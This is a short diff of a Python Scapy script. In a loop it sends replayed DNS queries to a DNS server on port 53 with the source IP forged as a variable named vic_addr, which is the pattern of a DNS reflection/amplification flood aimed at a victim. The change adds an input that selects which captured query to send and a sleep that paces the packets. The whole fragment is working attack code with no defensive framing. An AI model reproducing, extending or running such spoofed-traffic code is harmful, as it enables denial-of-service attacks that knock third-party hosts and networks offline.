@@ -54,9 +54,12 @@ def main():
     N = input()
     for i in range(0, N):
         a = input()
+        b = input()
         pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
-        pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[a].getlayer(DNS)
+        pkt = pkt /IP(dst=addr, src=vic_addr) / UDP(dport=53, sport=random.randint(49152,65535)) / q_pkt[b].getlayer(DNS)
         sendp(pkt, iface = iface, verbose=False)
+        
+        sleep(a)
 
     #print pkt.show()
     #print "----"
